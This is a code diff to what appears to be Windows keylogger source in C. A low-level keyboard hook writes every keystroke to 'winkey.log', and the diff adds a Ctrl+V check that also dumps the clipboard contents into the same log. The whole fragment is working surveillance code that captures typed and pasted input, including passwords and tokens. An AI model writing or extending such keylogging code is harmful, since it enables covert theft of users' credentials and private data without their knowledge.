@@ -41,6 +41,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
 		fopen_s(&flog, "winkey.log", "a");
 		fprintf_s(flog, "%s", shift ? _shkey[key->vkCode] : _key[key->vkCode]);
+		if (GetKeyState(VK_CONTROL) && key->vkCode == 'V')
+			GetClipboard(flog);
 		fclose(flog);
 	}
 	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
